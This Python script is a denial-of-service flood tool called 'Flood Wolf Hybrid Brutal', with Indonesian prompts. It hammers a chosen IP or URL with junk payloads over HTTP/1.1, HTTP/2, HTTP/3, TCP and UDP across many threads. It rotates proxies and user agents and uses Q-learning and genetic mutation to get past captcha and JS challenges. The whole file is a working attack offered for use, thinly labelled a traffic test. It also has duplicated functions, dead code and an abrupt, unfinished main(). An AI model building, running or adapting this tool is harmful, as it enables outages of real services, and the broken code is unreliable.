import os, time, signal, random, threading, socket, requests, base64, asyncio, aiohttp
import json, math
import numpy as np
from aiohttp import ClientSession, TCPConnector, ClientTimeout
from dataclasses import dataclass, field
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.live import Live
from rich.align import Align
from rich.text import Text
from urllib.parse import urlparse
from aioquic.asyncio.client import connect
from aioquic.h3.connection import H3_ALPN
from aioquic.quic.configuration import QuicConfiguration

console = Console()

BANNER = r"""
â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•—      â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—     â–ˆâ–ˆâ•—    â–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•—     â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—
â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•”â•â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—    â–ˆâ–ˆâ•‘    â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•”â•â•â•â•â•
â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘    â–ˆâ–ˆâ•‘ â–ˆâ•— â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  
â–ˆâ–ˆâ•”â•â•â•  â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘    â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•”â•â•â•  
â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•    â•šâ–ˆâ–ˆâ–ˆâ•”â–ˆâ–ˆâ–ˆâ•”â•â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘     
â•šâ•â•     â•šâ•â•â•â•â•â•â• â•šâ•â•â•â•â•â•  â•šâ•â•â•â•â•â• â•šâ•â•â•â•â•â•      â•šâ•â•â•â•šâ•â•â•  â•šâ•â•â•â•â•â• â•šâ•â•â•â•â•â•â•â•šâ•â•     
"""

user_agents = [
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.3",
    "Mozilla/5.0 (Android 15; Mobile; rv:136.0) Gecko/136.0 Firefox/136.0",
    "Mozilla/5.0 (Linux; Android 10; HD1913) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.7499.194 Mobile Safari/537.36 EdgA/143.0.3650.139",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.3124.85",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3.1 Mobile/15E148 Safari/604.",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_7_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 EdgiOS/134.3124.77 Mobile/15E148 Safari/605.1.15"
]

# === Global Stats ===
status_codes, proxy_fail_count, proto_stats, proxy_success, response_clusters = {}, {}, {}, {}, []

@dataclass
class SessionStats:
    start_ts: float = field(default_factory=time.time)
    events: int = 0
    ok: int = 0
    fail: int = 0
    last: str = "-"
    attack_mode: str = "-"
    attack_ok: int = 0
    attack_fail: int = 0
    total_bytes: int = 0
    active_threads: int = 0

    def uptime(self): 
        return time.time() - self.start_ts

    def rate(self): 
        return (self.events / self.uptime()) if self.uptime() > 0 else 0.0

    def bandwidth(self): 
        return (self.total_bytes / 1024 / 1024) / self.uptime() if self.uptime() > 0 else 0.0

# === Save/Load Q-Table (session memory) ===
def save_qtable(filename="qtable.json"):
    global Q_table
    with open(filename, "w") as f:
        json.dump(Q_table, f)

def load_qtable(filename="qtable.json"):
    global Q_table
    if os.path.exists(filename):
        with open(filename, "r") as f:
            data = json.load(f)
            for m in modes:
                if m not in data:
                    data[m] = {n:0.0 for n in modes}
                else:
                    for n in modes:
                        if n not in data[m]:
                            data[m][n] = 0.0
            Q_table = data
# === Genetic Evolution (AIV7) ===
def genetic_evolution(Q_table, ua):
    scores = {m: sum(Q_table[m].values()) for m in Q_table}
    top_modes = sorted(scores, key=scores.get, reverse=True)[:2]
    if len(top_modes) < 2:
        return generate_payload(random.choice(list(Q_table.keys())), ua)

    A, B = top_modes
    payload_A, _, _ = generate_payload(A, ua)
    payload_B, _, _ = generate_payload(B, ua)

    cut = len(payload_A)//2
    crossover = payload_A[:cut] + payload_B[cut:]

    mutation = bytearray(crossover)
    for i in range(random.randint(1,3)):
        idx = random.randint(0, len(mutation)-1)
        mutation[idx] = random.randint(33,126)
    new_payload = bytes(mutation)

    return new_payload, len(new_payload), f"genetic_{A}_{B}"

# === Genetic Evolution ===
def genetic_evolution(Q_table, ua):
    # Ambil 2 mode dengan reward tertinggi
    scores = {m: sum(Q_table[m].values()) for m in Q_table}
    top_modes = sorted(scores, key=scores.get, reverse=True)[:2]
    if len(top_modes) < 2:
        return generate_payload(random.choice(list(Q_table.keys())), ua)

    A, B = top_modes
    payload_A = generate_payload(A, ua)
    payload_B = generate_payload(B, ua)

    # Crossover
    cut = len(payload_A)//2
    crossover = payload_A[:cut] + payload_B[cut:]

    # Mutation
    mutation = list(crossover)
    for i in range(random.randint(1,3)):
        idx = random.randint(0, len(mutation)-1)
        mutation[idx] = chr(random.randint(33,126))  # random ASCII
    new_payload = "".join(mutation)

    return new_payload, len(new_payload), f"genetic_{A}_{B}"
    
# === Clustering Respons (AIV7) ===
def cluster_response(mode, response_text):
    if "Captcha" in response_text:
        response_clusters[mode] = "Captcha"
    elif "challenge" in response_text.lower():
        response_clusters[mode] = "JS-Challenge"
    elif "fingerprint" in response_text.lower():
        response_clusters[mode] = "Fingerprint"
    else:
        response_clusters[mode] = "Normal"
    return response_clusters[mode]

class HackerUI:
    def __init__(self, tool_name="Flood Wolf Brutal", user="ExProGm411"):
        self.tool_name = tool_name
        self.user = user
        self.stats = SessionStats()
        self._stop = False
        signal.signal(signal.SIGINT, self._on_sigint)

    def _on_sigint(self, sig, frame): 
        self._stop = True
        self.report(title="SESSION REPORT")

    def stopped(self): 
        return self._stop

    def boot(self, config_lines=None):
        os.system("clear")
        console.print(Panel.fit(Text(BANNER, style="red"), border_style="red"))
        cfg = "\n".join([f"[cyan]â€¢[/cyan] {x}" for x in config_lines]) if config_lines else ""
        console.print(Panel.fit(
            f"[bold]Tool:[/bold] {self.tool_name}\n[bold]User:[/bold] {self.user}\n[bold]Status:[/bold] [green]READY[/green]\n\n{cfg}",
            title="[bold red]BOOT[/bold red]", border_style="red"))

    def tick_ok(self, last_text, send_size=0):
        self.stats.events += 1
        self.stats.ok += 1
        self.stats.total_bytes += send_size
        self.stats.last = f"[green][+] {last_text}[/green]"

    def tick_fail(self, last_text):
        self.stats.events += 1
        self.stats.fail += 1
        self.stats.last = f"[red][-] {last_text}[/red]"

    def set_attack_mode(self, mode, ok, fail):
        self.stats.attack_mode, self.stats.attack_ok, self.stats.attack_fail = mode, ok, fail

    def live(self): 
        return Live(self._dashboard(), refresh_per_second=12, console=console)

    def _dashboard(self, title="RUNNING"):
        t = Table.grid(padding=(0, 1))
        t.add_column(justify="right", style="cyan", width=14)
        t.add_column(justify="left", style="white")
        t.add_row("Uptime", f"{self.stats.uptime():,.1f}s")
        t.add_row("Events", f"{self.stats.events:,}")
        t.add_row("OK / FAIL", f"{self.stats.ok:,} / {self.stats.fail:,}")
        t.add_row("Rate", f"{self.stats.rate():,.2f} / sec")
        t.add_row("Bandwidth", f"{self.stats.bandwidth():,.2f} MB/sec")
        t.add_row("Threads", f"{self.stats.active_threads}")
        t.add_row("Last", self.stats.last)
        return Panel(Align.left(t), title=f"[bold red]{title}[/bold red]", border_style="red")

    def update_live(self, live, title="RUNNING"): 
        live.update(self._dashboard(title=title))

    def report(self, title="SESSION REPORT"):
        # Session Overview
        table = Table(title=f"[bold magenta]{title}[/bold magenta]", border_style="magenta", show_lines=True)
        table.add_column("Metric", style="cyan", no_wrap=True)
        table.add_column("Value", style="white")
        table.add_row("Uptime", f"{self.stats.uptime():,.2f}s")
        table.add_row("Total Events", f"{self.stats.events:,}")
        table.add_row("OK", f"{self.stats.ok:,}")
        table.add_row("FAIL", f"{self.stats.fail:,}")
        table.add_row("Avg Rate", f"{self.stats.rate():,.2f} / sec")
        table.add_row("Bandwidth", f"{self.stats.bandwidth():,.2f} MB/sec")
        table.add_row("Threads", f"{self.stats.active_threads}")
        table.add_row("Last Event", self.stats.last)
        console.print(table)

        # Status Code Breakdown
        if status_codes:
            sc_table = Table(title="[bold magenta]Status Code Breakdown[/bold magenta]", border_style="magenta")
            sc_table.add_column("Code", style="cyan")
            sc_table.add_column("Count", style="white")
            for code, count in status_codes.items():
                sc_table.add_row(str(code), str(count))
            console.print(sc_table)

        # Payload Mode Summary
        mode_table = Table(title="[bold magenta]Payload Mode Summary[/bold magenta]", border_style="magenta", show_lines=True)
        mode_table.add_column("Mode", style="cyan")
        mode_table.add_column("Sent", style="white")
        mode_table.add_column("Success", style="green")
        mode_table.add_column("Fail", style="red")
        mode_table.add_column("Avg Latency", style="yellow")

        for mode in payload_stats.keys():
            sent = payload_stats.get(mode, 0) + fail_stats.get(mode, 0)
            success = payload_stats.get(mode, 0)
            fail = fail_stats.get(mode, 0)
            avg_latency = sum(latency_stats[mode]) / len(latency_stats[mode]) if latency_stats[mode] else 0
            mode_table.add_row(mode, str(sent), str(success), str(fail), f"{avg_latency:.2f}s")

        console.print(mode_table)

        # Adaptive Intelligence
        ai_table = Table(title="[bold magenta]Adaptive Intelligence[/bold magenta]", border_style="magenta", show_lines=True)
        ai_table.add_column("Mode", style="cyan")
        ai_table.add_column("Avg Latency (s)", style="white")
        ai_table.add_column("Samples", style="green")
        ai_table.add_column("Top Error", style="red")
        ai_table.add_column("Error Count", style="yellow")

        for mode in payload_stats.keys():
            if latency_stats[mode]:
                avg_latency = sum(latency_stats[mode]) / len(latency_stats[mode])
                samples = len(latency_stats[mode])
                latency_str = f"{avg_latency:.3f}"
            else:
                latency_str = "-"
                samples = 0

            if error_stats[mode]:
                top_err = max(error_stats[mode], key=error_stats[mode].get)
                err_count = error_stats[mode][top_err]
            else:
                top_err = "-"
                err_count = 0

            ai_table.add_row(mode, latency_str, str(samples), str(top_err), str(err_count))

        console.print(ai_table)

        # TCP/UDP Breakdown
        if proto_stats:
            proto_table = Table(title="[bold magenta]TCP/UDP Breakdown[/bold magenta]", border_style="magenta")
            proto_table.add_column("Type", style="cyan")
            proto_table.add_column("Count", style="white")
            for key, count in proto_stats.items():
                proto_table.add_row(key, str(count))
            console.print(proto_table)

        # Proxy Performance Summary
        if proxy_success or proxy_fail:
            proxy_table = Table(title="[bold magenta]Proxy Performance Summary[/bold magenta]", border_style="magenta", show_lines=True)
            proxy_table.add_column("Proxy", style="cyan")
            proxy_table.add_column("Success", style="green")
            proxy_table.add_column("Fail", style="red")
            proxy_table.add_column("Weight", style="yellow")

            proxies = set(list(proxy_success.keys()) + list(proxy_fail.keys()))
            for p in proxies:
                success = proxy_success.get(p, 0)
                fail = proxy_fail.get(p, 0)
                weight = max(1, (success + 1) - fail)
                label = "[green]High[/green]" if weight > 5 else "[yellow]Medium[/yellow]" if weight > 2 else "[red]Low[/red]"
                proxy_table.add_row(p, str(success), str(fail), label)

            console.print(proxy_table)

        # Save proxy results
        if proxy_success:
            with open("proxy_success.txt", "w") as f:
                for p in proxy_success.keys():
                    f.write(f"{p} SUCCESS:{proxy_success[p]}\n")
            console.print(f"[green][+] Saved {len(proxy_success)} successful proxies to proxy_success.txt[/green]")
        else:
            console.print("[yellow][!] Tidak ada proxy yang berhasil digunakan.[/yellow]")

        if proxy_fail:
            with open("proxy_fail.txt", "w") as f:
                for p, count in proxy_fail.items():
                    f.write(f"{p} FAILS:{count}\n")
            console.print(f"[red][-] Saved {len(proxy_fail)} failed proxies to proxy_fail.txt[/red]")

        # Exit Panel
        console.print(Panel.fit("[bold green]Exit clean. Respect.[/bold green]", border_style="green"))

        # âœ… Save Q-Table at the end of report
        save_qtable()
        console.print("[cyan][+] Q-Table saved to qtable.json[/cyan]")

	 # âœ… Response Clustering
if response_clusters:
    cl_table = Table(title="[bold magenta]Response Clustering[/bold magenta]", border_style="magenta")
    cl_table.add_column("Mode", style="cyan")
    cl_table.add_column("Cluster", style="yellow")
    for m, c in response_clusters.items():
        cl_table.add_row(m, c)
    console.print(cl_table)


    # === Helper functions ===
def load_proxies(filename):
    try:
        with open(filename, "r") as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        return []

def check_alive(ip, port):
    try:
        s = socket.create_connection((ip, port), timeout=3)
        s.close()
        return True
    except:
        return False

# === Payload generator (brutal + mixed) ===
mode_colors = {
    "hex": "cyan",
    "json": "green",
    "header": "yellow",
    "plain": "white",
    "mutate": "blue",
    "mixed": "magenta"
}



# === Adaptive AI Payload Generator v2 ===
payload_stats = {"hex":0, "json":0, "header":0, "plain":0, "mutate":0, "mixed":0}
fail_stats = {"hex":0, "json":0, "header":0, "plain":0, "mutate":0, "mixed":0}
latency_stats = {"hex":[], "json":[], "header":[], "plain":[], "mutate":[], "mixed":[]}
error_stats = {"hex":{}, "json":{}, "header":{}, "plain":{}, "mutate":{}, "mixed":{}}
current_mode = None

# === Proxy Smart Selector ===
proxy_success = {}
proxy_fail = {}

def update_proxy_stats(proxy, success=True):
    if success:
        proxy_success[proxy] = proxy_success.get(proxy, 0) + 1
    else:
        proxy_fail[proxy] = proxy_fail.get(proxy, 0) + 1

def choose_proxy(proxies):
    weighted_proxies = []
    for p in proxies:
        success_count = proxy_success.get(p, 0)
        fail_count = proxy_fail.get(p, 0)
        weight = max(1, (success_count + 1) - fail_count)
        weighted_proxies.extend([p] * weight)
    return random.choice(weighted_proxies) if weighted_proxies else random.choice(proxies)

# === Load/Save Session Memory ===
def load_payload_history():
    if os.path.exists("payload_history.json"):
        with open("payload_history.json", "r") as f:
            data = json.load(f)
            for mode in payload_stats.keys():
                payload_stats[mode] = data.get("payload_stats", {}).get(mode, 0)
                fail_stats[mode] = data.get("fail_stats", {}).get(mode, 0)

def save_payload_history():
    data = {"payload_stats": payload_stats, "fail_stats": fail_stats}
    with open("payload_history.json", "w") as f:
        json.dump(data, f)


# === Adaptive Payload Q-Learning ===

# === Stats & Rewards ===
modes = ["hex","json","header","plain","mutate","mixed"]
payload_stats = {m:0 for m in modes}
fail_stats = {m:0 for m in modes}
latency_stats = {m:[] for m in modes}
error_stats = {m:{} for m in modes}

# === Q-Table (state â†’ action) ===
Q_table = {m: {n: 0.0 for n in modes} for m in modes}
current_mode = random.choice(modes)
last_mode = None

# === Proxy Stats ===
proxy_success, proxy_fail = {}, {}

def update_proxy_stats(proxy, success=True):
    if success:
        proxy_success[proxy] = proxy_success.get(proxy, 0) + 1
    else:
        proxy_fail[proxy] = proxy_fail.get(proxy, 0) + 1

# === Q-Learning Chooser (epsilon-greedy) ===
def choose_mode_q(state, epsilon=0.1):
    if random.random() < epsilon:
        return random.choice(modes)
    return max(Q_table[state], key=Q_table[state].get)

# === Q-Table Update ===
def update_qtable(state, action, reward, next_state, alpha=0.1, gamma=0.9):
    best_next = max(Q_table[next_state].values())
    Q_table[state][action] += alpha * (reward + gamma * best_next - Q_table[state][action])

# === Adaptive Payload Q-Learning + GA + Clustering (AIV7) ===
def adaptive_payload_q(ua, last_status=None, latency=None, error_type=None, proxy=None, response_text=None):
    global current_mode, last_mode

    reward = 0
    if last_status == 200:
        reward += 2
    elif last_status:
        reward -= 1
    if latency:
        reward -= latency
    if error_type:
        reward -= 2

    # clustering respons kalau ada teks
    if response_text:
        if isinstance(response_text, bytes):
            response_text = response_text.decode(errors="ignore")
        cluster_response(current_mode, response_text)

    # update statistik
    if current_mode:
        payload_stats[current_mode] += 1
        if last_status != 200:
            fail_stats[current_mode] += 1
        if latency:
            latency_stats[current_mode].append(latency)
            if len(latency_stats[current_mode]) > 50:
                latency_stats[current_mode] = latency_stats[current_mode][-50:]
        if error_type:
            error_stats[current_mode][error_type] = error_stats[current_mode].get(error_type, 0) + 1

    # update Q-table
    if last_mode is not None:
        update_qtable(last_mode, current_mode, reward, current_mode)

    # pilih mode berikutnya
    next_mode = choose_mode_q(current_mode)
    last_mode = current_mode
    current_mode = next_mode

    # jika reward stagnan â†’ genetic evolution
    if all(v == 0.0 for v in Q_table[current_mode].values()):
        return genetic_evolution(Q_table, ua)

    # generate payload normal
    return generate_payload(current_mode, ua)

    # dynamic payload size
    size_factor = 1.0
    if latency and latency > 2.0: size_factor = 0.5
    elif latency and latency < 1.0: size_factor = 1.5
    if proxy and proxy_fail.get(proxy,0) > proxy_success.get(proxy,0):
        if current_mode in ["mutate","mixed"]:
            size_factor *= 0.7

    # === Payload Generator (modular) ===
def generate_payload(mode, ua):
    payload_body = ""

    if mode == "hex":
        payload_body = "".join(random.choice("0123456789ABCDEF") for _ in range(random.randint(2048,8192)))

    elif mode == "json":
        payload_body = '{"data":"%s"}' % ("X" * random.randint(1024,4096))

    elif mode == "header":
        headers = [
            str(f"X-Custom-{random.randint(1000,9999)}: {''.join(random.choice('ABCDEF') for _ in range(64))}")
            for _ in range(random.randint(5,20))
        ]
        payload_body = "\r\n".join(headers)

    elif mode == "mutate":
        raw = "".join(random.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789") for _ in range(random.randint(4096,8192)))
        payload_body = base64.b64encode(raw.encode()).decode()

    elif mode == "mixed":
        headers = [
            str(f"X-Mixed-{random.randint(1000,9999)}: {''.join(random.choice('ABCDEF') for _ in range(32))}")
            for _ in range(random.randint(3,10))
        ]
        json_part = '{"mix":"%s"}' % ("Y" * random.randint(512,2048))
        hex_part = "".join(random.choice("0123456789ABCDEF") for _ in range(random.randint(1024,4096)))
        payload_body = "\r\n".join(headers) + "\r\n" + json_part + "\r\n" + hex_part

    else:  # plain
        payload_body = "A" * random.randint(2048,8192)

    # final payload: encode ke bytes untuk dikirim ke server
    payload = (f"User-Agent: {ua}\r\nX-Mode: {mode}\r\n" + payload_body).encode()
    return payload, len(payload), mode
    
# === HTTP/1.1 mode + TCP/UDP fallback ===
def send_packet(ip, port, ui, delay_min, delay_max, proxies=None, target_url=None):
    proxy_index = 0
    last_status = None
    while not ui.stopped():
        try:
            ua = random.choice(user_agents)
            start = time.time()
            payload, send_size, mode = generate_payload(mode=random.choice(["hex","json","header","mutate","mixed","plain"]), ua=ua)

            proxy = None
            if proxies:
                proxy = proxies[proxy_index]
                proxy_index = (proxy_index + 1) % len(proxies)

            if target_url:  # HTTP/1.1
                try:
                    r = requests.post(
                        target_url,
                        headers={
                            "User-Agent": ua,
                            "Accept": "*/*",
                            "Content-Type": "application/x-www-form-urlencoded",
                            "Connection": "keep-alive",
                            "Accept-Encoding": "gzip, deflate",
                            "Referer": target_url
                        },
                        data=payload,
                        proxies={"http": proxy, "https": proxy} if proxy else None,
                        timeout=3
                    )
                    latency = time.time() - start
                    last_status = r.status_code
                    adaptive_payload_q(ua, last_status, latency, proxy=proxy, response_text=r.text)
                    status_codes[r.status_code] = status_codes.get(r.status_code, 0) + 1
                    ui.tick_ok(f"HTTP/1.1 [{r.status_code}] via {proxy if proxy else 'DIRECT'} mode={mode}", send_size)
                except Exception as e:
                    latency = time.time() - start
                    last_status = None
                    adaptive_payload_q(ua, None, latency, error_type="timeout", proxy=proxy)
                    ui.tick_fail(f"HTTP/1.1 FAIL: {str(e)}")
            else:
                # TCP
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(2)
                    s.connect((ip, port))
                    s.sendall(payload)
                    s.close()
                    latency = time.time() - start
                    adaptive_payload_q(ua, 200, latency, proxy=proxy)
                    ui.tick_ok(f"TCP -> {ip}:{port} mode={mode}", send_size)
                except Exception as e:
                    latency = time.time() - start
                    adaptive_payload_q(ua, None, latency, error_type="tcp_fail", proxy=proxy)
                    ui.tick_fail(f"TCP FAIL: {str(e)}")

                # UDP
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    s.sendto(payload, (ip, port))
                    s.close()
                    latency = time.time() - start
                    adaptive_payload_q(ua, 200, latency, proxy=proxy)
                    ui.tick_ok(f"UDP -> {ip}:{port} mode={mode}", send_size)
                except Exception as e:
                    latency = time.time() - start
                    adaptive_payload_q(ua, None, latency, error_type="udp_fail", proxy=proxy)
                    ui.tick_fail(f"UDP FAIL: {str(e)}")

        except Exception as e:
            ui.tick_fail(str(e))
            
        time.sleep(random.uniform(delay_min, delay_max))

# === HTTP/2 mode (aiohttp) ===
async def send_packet_async(ip, port, ui, delay_min, delay_max, proxies=None, target_url=None):
    proxy_index = 0
    connector = TCPConnector(ssl=False)
    timeout = ClientTimeout(total=5)
    last_status = None

    async with ClientSession(connector=connector, timeout=timeout) as session:
        while not ui.stopped():
            try:
                ua = random.choice(user_agents)
                start = time.time()
                payload, send_size, mode = generate_payload(mode=random.choice(["hex","json","header","mutate","mixed","plain"]), ua=ua)

                proxy = None
                if proxies:
                    proxy = proxies[proxy_index]
                    proxy_index = (proxy_index + 1) % len(proxies)

                try:
                    async with session.post(
                        target_url,
                        headers={
                            "User-Agent": ua,
                            "Accept": "*/*",
                            "Content-Type": "application/x-www-form-urlencoded",
                            "Connection": "keep-alive",
                            "Accept-Encoding": "gzip, deflate",
                            "Referer": target_url
                        },
                        data=payload,
                        proxy=proxy if proxy else None
                    ) as resp:
                        body = await resp.read()  # bytes
                        latency = time.time() - start
                        last_status = resp.status
                        adaptive_payload_q(ua, last_status, latency, proxy=proxy, response_text=body)
                        status_codes[resp.status] = status_codes.get(resp.status, 0) + 1
                        ui.tick_ok(f"HTTP/2 via {proxy if proxy else 'DIRECT'} [{resp.status}] mode={mode}", send_size)
                        ui.set_attack_mode("HTTP2",
                                           status_codes.get(200, 0),
                                           sum(status_codes.values()) - status_codes.get(200, 0))
                        if proxy and resp.status == 200:
                            update_proxy_stats(proxy, success=True)
                except Exception as e:
                    latency = time.time() - start
                    adaptive_payload_q(ua, None, latency, error_type="timeout", proxy=proxy)
                    last_status = None
                    ui.tick_fail(f"HTTP/2 FAIL: {str(e)}")
                    if proxy:
                        update_proxy_stats(proxy, success=False)
            except Exception as e:
                ui.tick_fail(str(e))

            await asyncio.sleep(random.uniform(delay_min, delay_max))

# === HTTP/3 mode (aioquic) ===
async def send_packet_http3(ip, port, ui, delay_min, delay_max, target_url=None):
    last_status = None
    while not ui.stopped():
        try:
            ua = random.choice(user_agents)
            start = time.time()
            payload, send_size, mode = generate_payload(mode=random.choice(["hex","json","header","mutate","mixed","plain"]), ua=ua)
            color = mode_colors.get(mode, "white")

            config = QuicConfiguration(is_client=True, alpn_protocols=H3_ALPN)
            async with connect(ip, port, configuration=config) as client:
                h3 = client.http
                stream_id = h3.get_next_available_stream_id()

                headers = [
                    (b":method", b"POST"),
                    (b":scheme", b"https"),
                    (b":authority", ip.encode()),
                    (b":path", b"/"),
                    (b"user-agent", ua.encode()),
                    (b"x-mode", mode.encode()),
                    (b"accept", b"*/*"),
                    (b"content-type", b"application/x-www-form-urlencoded"),
                    (b"connection", b"keep-alive"),
                    (b"accept-encoding", b"gzip, deflate"),
                ]

                h3.send_headers(stream_id, headers)
                h3.send_data(stream_id, payload, end_stream=True)

                events = await client.wait_for_events()
                if not events:
                    latency = time.time() - start
                    adaptive_payload_q(ua, None, latency, error_type="no_response")
                    last_status = None
                    ui.tick_fail("HTTP/3 no response")
                else:
                    for ev in events:
                        if hasattr(ev, "headers"):
                            latency = time.time() - start
                            last_status = 200
                            adaptive_payload_q(ua, last_status, latency, response_text=str(ev.headers))
                            ui.tick_ok(f"[{color}]HTTP/3 headers {ev.headers} mode={mode}[/]", send_size)
                            status_codes[200] = status_codes.get(200, 0) + 1
                            ui.set_attack_mode("HTTP3",
                                               status_codes.get(200, 0),
                                               sum(status_codes.values()) - status_codes.get(200, 0))
        except Exception as e:
            latency = time.time() - start
            adaptive_payload_q(ua, None, latency, error_type="http3_fail")
            last_status = None
            ui.tick_fail(f"HTTP/3 FAIL: {str(e)}")

        await asyncio.sleep(random.uniform(delay_min, delay_max))
# === Attack dispatcher (Q-Learning) ===
def attack(ip, port, threads, delay_min, delay_max, ui, proxies=None, target_url=None, http_mode=None):
    ui.stats.active_threads = threads

    if http_mode == "1":  # HTTP/1.1
        for _ in range(threads):
            threading.Thread(target=send_packet,
                             args=(ip, port, ui, delay_min, delay_max, proxies, target_url),
                             daemon=True).start()
        with ui.live() as live:
            while not ui.stopped():
                ui.update_live(live)
                time.sleep(0.2)

    elif http_mode == "2":  # HTTP/2
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        tasks = [loop.create_task(send_packet_async(ip, port, ui, delay_min, delay_max, proxies, target_url))
                 for _ in range(threads)]
        try:
            with ui.live() as live:
                while not ui.stopped():
                    ui.update_live(live)
                    loop.run_until_complete(asyncio.sleep(0.2))
        except KeyboardInterrupt:
            ui._stop = True
            for task in tasks:
                task.cancel()

    elif http_mode == "3":  # HTTP/3
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        tasks = [loop.create_task(send_packet_http3(ip, port, ui, delay_min, delay_max, target_url))
                 for _ in range(threads)]
        try:
            with ui.live() as live:
                while not ui.stopped():
                    ui.update_live(live)
                    loop.run_until_complete(asyncio.sleep(0.2))
        except KeyboardInterrupt:
            ui._stop = True
            for task in tasks:
                task.cancel()

    else:  # IP mode â†’ TCP/UDP flood
        for _ in range(threads):
            threading.Thread(target=send_packet,
                             args=(ip, port, ui, delay_min, delay_max, None, None),
                             daemon=True).start()
        with ui.live() as live:
            while not ui.stopped():
                ui.update_live(live)
                time.sleep(0.2)
# === Menu input ===
def menu():
    os.system("clear")
    console.print(Panel.fit(Text(BANNER, style="red"),
                            title="[bold red]Flood Wolf Hybrid[/bold red]",
                            border_style="red"))
    console.print("[bold cyan]=== Traffic Test Tool Hybrid ===[/bold cyan]\n")

    target = console.input("[bold red][+] Masukkan target IP/URL: [/bold red] ").strip()
    display_target = target

    if target.startswith("http://") or target.startswith("https://"):
        parsed = urlparse(target)
        ip = socket.gethostbyname(parsed.hostname) if parsed.hostname else target
        port = 443 if parsed.scheme == "https" else 80
        target_url = target
        http_mode = console.input("[bold red][+] Pilih mode HTTP (1=HTTP/1.1, 2=HTTP/2, 3=HTTP/3): [/bold red] ").strip()
    else:
        ip = target
        port_input = console.input("[bold red][+] Masukkan port (80/443 atau kosong untuk acak): [/bold red] ").strip()
        if port_input:
            try:
                port = int(port_input)
            except ValueError:
                console.print("[red][!] Port harus berupa angka. Default ke 80.[/red]")
                port = 80
        else:
            # ðŸ”¥ kalau kosong â†’ random port
            port = random.randint(1024, 65535)
        target_url = None
        http_mode = None

    threads_input = console.input("[bold red][+] Masukkan jumlah threads: [/bold red] ").strip()
    threads = int(threads_input) if threads_input else 100

    delay_min_input = console.input("[bold red][+] Masukkan delay minimum (detik): [/bold red] ").strip()
    delay_max_input = console.input("[bold red][+] Masukkan delay maksimum (detik): [/bold red] ").strip()
    delay_min = float(delay_min_input) if delay_min_input else 0.1
    delay_max = float(delay_max_input) if delay_max_input else 0.5

    use_proxy = console.input("[bold red][+] Gunakan proxy.txt? (y/n): [/bold red] ").strip().lower()
    proxies = load_proxies("proxy.txt") if use_proxy == "y" else None

    if http_mode == "3" and proxies:
        console.print("[yellow][!] Mode HTTP/3 tidak mendukung proxy. Proxy akan diabaikan.[/yellow]")
        proxies = None

    return ip, port, threads, delay_min, delay_max, proxies, display_target, target_url, http_mode
# === Main runner ===
def main():
    ip, port, threads, delay_min, delay_max, proxies, display_target, target_url, http_mode = menu()
    ui = HackerUI(tool_name="Flood Wolf Hybrid Brutal", user="ExProGm411")

    alive = check_alive(ip, port if port else 80)
